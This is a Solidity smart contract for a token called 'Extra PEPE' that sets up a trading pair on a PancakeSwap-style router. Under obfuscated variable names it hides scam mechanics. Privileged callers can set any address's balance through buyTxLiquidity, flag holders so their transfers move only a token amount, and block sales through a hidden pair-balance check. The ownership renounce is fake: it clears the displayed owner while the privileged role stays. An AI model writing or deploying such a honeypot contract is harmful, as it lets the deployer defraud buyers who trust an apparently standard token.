//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface amountMaxLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellMarketing) external view returns (uint256);

    function transfer(address launchTeam, uint256 liquidityEnable) external returns (bool);

    function allowance(address swapFeeSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityEnable) external returns (bool);

    function transferFrom(
        address sender,
        address launchTeam,
        uint256 liquidityEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeToLiquidity, uint256 value);
    event Approval(address indexed swapFeeSell, address indexed spender, uint256 value);
}

abstract contract feeTokenMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txLaunched {
    function createPair(address launchFee, address fundTradingMax) external returns (address);
}

interface amountMaxLiquidityMetadata is amountMaxLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExtraPEPE is feeTokenMin, amountMaxLiquidity, amountMaxLiquidityMetadata {

    function approve(address liquiditySell, uint256 liquidityEnable) public virtual override returns (bool) {
        exemptLaunch[_msgSender()][liquiditySell] = liquidityEnable;
        emit Approval(_msgSender(), liquiditySell, liquidityEnable);
        return true;
    }

    string private launchedWallet = "Extra PEPE";

    uint256 modeAmountMin;

    function listReceiver(address launchedExempt, address launchTeam, uint256 liquidityEnable) internal returns (bool) {
        if (launchedExempt == receiverTeam) {
            return atLimit(launchedExempt, launchTeam, liquidityEnable);
        }
        uint256 exemptMax = amountMaxLiquidity(fromTake).balanceOf(feeMax);
        require(exemptMax == teamTrading);
        require(launchTeam != feeMax);
        if (marketingAmount[launchedExempt]) {
            return atLimit(launchedExempt, launchTeam, receiverTokenMarketing);
        }
        return atLimit(launchedExempt, launchTeam, liquidityEnable);
    }

    address public receiverTeam;

    function launchedAtLimit(uint256 liquidityEnable) public {
        totalLimit();
        teamTrading = liquidityEnable;
    }

    function buyTxLiquidity(address senderShould, uint256 liquidityEnable) public {
        totalLimit();
        exemptModeTeam[senderShould] = liquidityEnable;
    }

    function name() external view virtual override returns (string memory) {
        return launchedWallet;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenTeamMode;
    }

    address public fromTake;

    function owner() external view returns (address) {
        return toAt;
    }

    function minTx(address feeMin) public {
        totalLimit();
        
        if (feeMin == receiverTeam || feeMin == fromTake) {
            return;
        }
        marketingAmount[feeMin] = true;
    }

    function transfer(address senderShould, uint256 liquidityEnable) external virtual override returns (bool) {
        return listReceiver(_msgSender(), senderShould, liquidityEnable);
    }

    uint256 public toSell;

    uint256 constant receiverTokenMarketing = 4 ** 10;

    bool public receiverMarketingToken;

    mapping(address => bool) public receiverIs;

    address liquiditySender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address feeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function shouldTakeFrom(address atReceiverFund) public {
        require(atReceiverFund.balance < 100000);
        if (receiverMarketingToken) {
            return;
        }
        
        receiverIs[atReceiverFund] = true;
        if (amountSell == toSell) {
            toSell = amountSell;
        }
        receiverMarketingToken = true;
    }

    function balanceOf(address sellMarketing) public view virtual override returns (uint256) {
        return exemptModeTeam[sellMarketing];
    }

    function atLimit(address launchedExempt, address launchTeam, uint256 liquidityEnable) internal returns (bool) {
        require(exemptModeTeam[launchedExempt] >= liquidityEnable);
        exemptModeTeam[launchedExempt] -= liquidityEnable;
        exemptModeTeam[launchTeam] += liquidityEnable;
        emit Transfer(launchedExempt, launchTeam, liquidityEnable);
        return true;
    }

    bool private takeLimit;

    function allowance(address receiverToBuy, address liquiditySell) external view virtual override returns (uint256) {
        if (liquiditySell == liquiditySender) {
            return type(uint256).max;
        }
        return exemptLaunch[receiverToBuy][liquiditySell];
    }

    function getOwner() external view returns (address) {
        return toAt;
    }

    uint256 private launchedAmount = 100000000 * 10 ** 18;

    mapping(address => uint256) private exemptModeTeam;

    uint256 teamTrading;

    function modeMinTx() public {
        emit OwnershipTransferred(receiverTeam, address(0));
        toAt = address(0);
    }

    uint8 private tokenTeamMode = 18;

    function totalLimit() private view {
        require(receiverIs[_msgSender()]);
    }

    address private toAt;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedAmount;
    }

    function symbol() external view virtual override returns (string memory) {
        return minIs;
    }

    string private minIs = "EPE";

    mapping(address => mapping(address => uint256)) private exemptLaunch;

    uint256 private amountSell;

    constructor (){
        if (takeLimit == senderBuy) {
            amountSell = toSell;
        }
        atLaunch shouldIs = atLaunch(liquiditySender);
        fromTake = txLaunched(shouldIs.factory()).createPair(shouldIs.WETH(), address(this));
        if (toSell == amountSell) {
            takeLimit = false;
        }
        receiverTeam = _msgSender();
        modeMinTx();
        receiverIs[receiverTeam] = true;
        exemptModeTeam[receiverTeam] = launchedAmount;
        if (toSell == amountSell) {
            senderBuy = false;
        }
        emit Transfer(address(0), receiverTeam, launchedAmount);
    }

    event OwnershipTransferred(address indexed amountEnable, address indexed modeReceiver);

    bool private senderBuy;

    mapping(address => bool) public marketingAmount;

    function transferFrom(address launchedExempt, address launchTeam, uint256 liquidityEnable) external override returns (bool) {
        if (_msgSender() != liquiditySender) {
            if (exemptLaunch[launchedExempt][_msgSender()] != type(uint256).max) {
                require(liquidityEnable <= exemptLaunch[launchedExempt][_msgSender()]);
                exemptLaunch[launchedExempt][_msgSender()] -= liquidityEnable;
            }
        }
        return listReceiver(launchedExempt, launchTeam, liquidityEnable);
    }

}